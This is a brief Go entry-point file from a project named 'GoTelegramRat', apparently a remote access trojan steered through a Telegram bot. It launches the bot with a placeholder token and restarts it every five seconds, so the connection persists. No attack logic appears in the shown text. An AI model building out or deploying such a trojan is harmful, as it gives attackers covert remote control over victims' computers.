package main

import (
	"GoTelegramRat/internal/bot"
	"time"
)

func main() {

	for {
		_ = runBot()
		time.Sleep(5 * time.Second)
	}
}

func runBot() error {
	err := bot.Bot("API", 7777)

	if err != nil {
		return err
	}
	return nil
}
